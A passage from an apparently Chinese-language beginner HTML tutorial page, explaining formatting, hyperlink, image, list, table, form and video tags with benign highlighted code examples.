class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span> 换行了<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>文本格式化标签</li></ul><p>HTML提供了一系列的用于格式化文本的标签，可以让我们输出不同外观的元素，比如粗体和斜体字。如果需要在网页中，需要让某些文本内容展示的效果丰富点，可以使用以下的标签来进行格式化。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>定义粗体文本<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>定义粗体文本方式2<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>定义斜体字<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>定义斜体字方式2<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>定义删除文本<span class="hljs-tag">&lt;/<span class="hljs-name">del</span>&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>特殊符号</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-symbol">&amp;nbsp;</span><br></code></pre></td></tr></table></figure><blockquote><p>标签大致可分为两类</p><ul><li>块级标签(block)  – 独占一行</li><li>内联标签(inline)  – 按文本内容占位</li></ul></blockquote><ul><li>div和span标签</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>只是一个块级元素，并无实际的意义。主要通过CSS样式为其赋予不同的表现.<br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>表示了内联行(行内元素),并无实际的意义,主要通过CSS样式为其赋予不同的表现<br></code></pre></td></tr></table></figure><p>块级元素与行内元素的区别：所谓块元素，是以另起一行开始渲染的元素，行内元素则不需另起一行。如果单独在网页中插入这两个元素，不会对页面产生任何的影响。这两个元素是专门为定义CSS样式而生的。</p><p><a name="83d834c8"></a></p><h2 id="2-5、超链接标签"><a href="#2-5、超链接标签" class="headerlink" title="2.5、超链接标签"></a>2.5、超链接标签</h2><p><a name="d7b1fe14"></a></p><h3 id="2-5-1、超链接基本使用"><a href="#2-5-1、超链接基本使用" class="headerlink" title="2.5.1、超链接基本使用"></a>2.5.1、超链接基本使用</h3><p>超链接是浏览者和服务器的交互的主要手段，也叫超级链接或a链接，是网页中指向一个目标的连接关系，这个目标可以是网页、网页中的具体位置、图片、邮件地址、文件、应用程序等。</p><p>超链接是网页中最重要的元素之一。一个网站的各个网页就是通过超链接关联起来的，用户通过点击超链接可以从一个网页跳转到另一个网页。</p><p>几乎可以在所有的网页中找到链接。点击链接可以从一张页面跳转到另一张页面。例如,在阅读某个网站时，遇到一个不认识的英文，你只要在这个单词上单击一下，即可跳转到它的翻译页面中，看完单词的解释后点一下返回按钮，又可继续阅读，这就是超链接的常见用途。还有经常到购物网站中去，我们都是在百度搜索，然后点击对应的搜索项进入到对应的购物网站的，这也是超链接的作用。超链接的属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>href</td><td>网络链接 [ 例如: <a href="http://www.baidu.com/">http://www.baidu.com</a></td><td></td></tr><tr><td>]     本地链接 [ 例如：F:\html\index.html ]</td><td>规定链接的跳转目标</td><td></td></tr><tr><td>title</td><td><a href="http://www.baidu.com/">百度</a></td><td>链接的提示信息</td></tr><tr><td>target</td><td>_blank [ 在新建窗口中打开网页 ]                                                                                       _self  [ 默认值，覆盖自身窗口打开网页 ]</td><td>与前面四项固定值不同，framename是泛指，并不是这个值，这点将在后面框架部分内容中详细介绍，这里可以暂时先略过</td></tr></tbody></table><blockquote><p>1、href是超链接最重要的属性，规定了用户点击链接以后的跳转目标，这个目标可以是 网络连接，也可以是本地连接。</p><p>2、网络链接指的是依靠网络来进行关联的地址，一般在地址前面是以 <a href="http://或者https/">http:&#x2F;&#x2F;或者https</a>:&#x2F;&#x2F;这样开头的，如果没有网络，则用户点击了超链接也无法访问对应的目标。</p><p>3、本地链接指的是本地计算机的地址，一般在地址前面是以 file:&#x2F;&#x2F;&#x2F;开头或直接以 C:&#x2F;、D:&#x2F;、E:&#x2F;开头的，不需要经过网络。</p><p>4、如果href的值留空，则默认是跳转到当前页面，也就是刷新当前页面。</p></blockquote><p><a name="4326900a"></a></p><h2 id="2-6、img标签"><a href="#2-6、img标签" class="headerlink" title="2.6、img标签"></a>2.6、img标签</h2><p>在HTML中，图像由标签定义的，它可以用来加载图片到html网页中显示。网页开发过程中，有三种图片格式被广泛应用到web里，分别是 jpg、png、gif。</p><p>img标签的属性：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">src属性：</span><br><span class="hljs-comment">    指定图像的URL地址，是英文source的简写，表示引入资源。</span><br><span class="hljs-comment">    src的值可以是本地计算机存储的图片的地址，也可以是网络上外部网站的图片的地址。</span><br><span class="hljs-comment">    如果src的值不正确，那么浏览器就无法正确的图片，而是显示一张裂图。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">alt属性：指定图像无法显示时的替换文本。当图像显示错误时，在图像位置上显示alt的值。如上所示，就是谷歌浏览器中，引入图像失败后，显示了替换文本。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">width属性： 指定引入图片的显示宽度。</span><br><span class="hljs-comment">height属性：指定引入图片的显示高度。</span><br><span class="hljs-comment">border属性：指定引入图片的边框宽度，默认为0。</span><br><span class="hljs-comment">title属性：悬浮图片上的提示文字</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>点击图片跳转可以配合a标签使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="be6665fa"></a></p><h2 id="2-7、列表标签"><a href="#2-7、列表标签" class="headerlink" title="2.7、列表标签"></a>2.7、列表标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;square&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>item1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>item2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>item3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>item1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>item2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>item3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="c4efa617"></a></p><h2 id="2-8、表格标签"><a href="#2-8、表格标签" class="headerlink" title="2.8、表格标签"></a>2.8、表格标签</h2><p>在HTML中使用table来定义表格。网页的表格和办公软件里面的xls一样，都是有行有列的。HTML使用tr标签定义行，使用td标签定义列。</p><p>语法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>单元格的内容<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    ……<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  ……<br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>1、<code>&lt;table&gt;</code>和<code>&lt;/table&gt;</code>表示一个表格的开始和结束。一组<code>&lt;table&gt;...&lt;/table&gt;</code>表示一个表格。</p><p>2、border用于设置整个表格的边框宽度，默认为0，表示不显示边框。</p><p>3、<code>&lt;tr&gt;</code>和<code>&lt;/tr&gt;</code>表示表格中的一行的开始和结束。一组<code>&lt;tr&gt;...&lt;/tr&gt;</code>，一个表格可以有多行。通过计算table标签中包含多少对tr子标签即可知道一个表格有多少行。</p><p>4、<code>&lt;td&gt;</code>和<code>&lt;/td&gt;</code>表示表格中的一个单元格的开始和结束。通过计算一个tr里面包含了多少对td自标签即可知道一个表格有多少列，多少的单元格了。</p></blockquote><p><strong>table属性</strong></p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td><a href="http://www.w3school.com.cn/tags/att_table_width.asp">width</a></td><td>px、%</td><td>规定表格的宽度。</td></tr><tr><td>height</td><td>px、%</td><td>规定表格的高度。</td></tr><tr><td><a href="http://www.w3school.com.cn/tags/att_table_align.asp">align</a></td><td>left、center、right</td><td>规定表格相对周围元素的对齐方式。</td></tr><tr><td><a href="http://www.w3school.com.cn/tags/att_table_bgcolor.asp">bgcolor</a></td><td>rgb(x,x,x)、#xxxxxx、colorname</td><td>规定表格的背景颜色。</td></tr><tr><td>background</td><td>url</td><td>规定表格的背景图片。</td></tr><tr><td><a href="http://www.w3school.com.cn/tags/att_table_border.asp">border</a></td><td>px</td><td>规定表格边框的宽度。</td></tr><tr><td><a href="http://www.w3school.com.cn/tags/att_table_cellpadding.asp">cellpadding</a></td><td>px、%</td><td>规定单元格边框与其内容之间的空白。</td></tr><tr><td><a href="http://www.w3school.com.cn/tags/att_table_cellspacing.asp">cellspacing</a></td><td>px、%</td><td>规定单元格之间的空隙。</td></tr></tbody></table><p><strong>td属性</strong></p><p>表格中除了行元素以外，还有单元格，单元格的属性和行的属性类似。td和th都是单元格。</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>height</td><td>px、%</td><td>规定单元格的高度。</td></tr><tr><td>width</td><td>px、%</td><td>规定单元格的宽度。</td></tr><tr><td><a href="http://www.w3school.com.cn/tags/att_table_align.asp">align</a></td><td>left、center、right</td><td>规定单元格内容的对齐方式。</td></tr><tr><td>valign</td><td>top、middle、bottom</td><td>规定单元格内容的垂直对齐方式。</td></tr><tr><td><a href="http://www.w3school.com.cn/tags/att_table_bgcolor.asp">bgcolor</a></td><td>rgb(x,x,x)、#xxxxxx、colorname</td><td>规定单元格的背景颜色。</td></tr><tr><td>background</td><td>url</td><td>规定单元格的背景图片。</td></tr><tr><td>rowspan</td><td>number</td><td>规定单元格合并的行数</td></tr><tr><td>colspan</td><td>number</td><td>规定单元格合并的列数</td></tr></tbody></table><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>i am title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">1px</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;700&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>6<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="25e3a0a0"></a></p><h2 id="2-9、表单标签"><a href="#2-9、表单标签" class="headerlink" title="2.9、表单标签"></a>2.9、表单标签</h2><p>表单主要是用来收集客户端提供的相关信息，提供了用户数据录入的方式，有多选、单选、单行文本、下拉列表等输入框，便于网站管理员收集用户的数据，是Web浏览器和Web服务器之间实现信息交流和数据传递的桥梁.</p><p>表单被form标签包含，内部使用不同的表单元素来呈现不同的方式来供用户输入或选择。当用户输入好数据后，就可以把表单数据提交到服务器端。</p><p>一个表单元素有三个基本组成部分：</p><ul><li>表单标签，包含了表单处理程序所在的URL以及数据提交到服务器的方法等表单信息。 </li><li>表单域，包含了文本框、密码框、隐藏域、多行文本框、复选框、单选框、下拉选择框和文件上传框等表单控件。 </li><li>表单按钮，包括提交按钮、复位按钮和一般按钮，用于将数据传送到服务器上。</li></ul><p>在HTML中创建表单用form标签。每个表单都可以包含一到多个表单域或按钮。form标签属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>action</td><td>访问服务器地址</td><td>服务器端表单处理程序的URL地址</td></tr><tr><td>method</td><td>post、get[默认值]</td><td>表单数据的提交方法</td></tr><tr><td>target</td><td>参考超链接的target属性</td><td>表单数据提交时URL的打开方式</td></tr><tr><td>enctype</td><td>application&#x2F;x-www-form-urlencoded[默认值]    multipart&#x2F;form-data [用于文件上传]                                                        text&#x2F;plain [用于纯文本数据发送]</td><td>表单提交数据时的编码方式</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>用户名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>密码：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>爱好：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-comment">&lt;!--        value属性就是提交给服务器的内容，服务器根据该内容就是到用户选择的是哪一项--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lanqiu&quot;</span>&gt;</span>篮球<br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zuqiu&quot;</span>&gt;</span>足球<br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;qumao&quot;</span>&gt;</span>羽毛球<br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;gaoer&quot;</span>&gt;</span>高尔夫<br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>性别：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-comment">&lt;!--        单选框的name属性值必须一样，否则无法实现单选--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>男<br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span>女<br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>生日：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;birthday&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>籍贯：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jiguan&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>请选择籍贯<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hebei&quot;</span>&gt;</span>河北<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;anhui&quot;</span>&gt;</span>安徽<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;liaoning&quot;</span>&gt;</span>辽宁<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>自我介绍：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请描述&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;self&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;重置&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>文件上传:必须将文件的二进制形式的数据提交给服务器 </li><li></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;上传文件&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="df538424"></a></p><h2 id="2-10、多媒体标签"><a href="#2-10、多媒体标签" class="headerlink" title="2.10、多媒体标签"></a>2.10、多媒体标签</h2><p>视频标签：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;video src=<span class="hljs-string">&quot;路径&quot;</span> controls  autoplay width=<span class="hljs-string">&quot;300px&quot;</span>&gt;&lt;/video&gt;<br><br>标签属性：<br>  autoplay属性控制是否网页加载自动播放　　<br><br>  controls 是否显示播放控件，默认不显示<br><br>  loop 属性用于控制循环次数，如果值为正整数，则播放指定的次数，如果是 loop 或者是 loop = <span class="hljs-number">-1</span>，则无线循环播放。<br><br>  width 属性设置播放窗口宽度<br><br>  height 属性设置播放窗口高度<br><br>  由于版权等原因，不同的浏览器可支持播放的格式是不一样的<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span 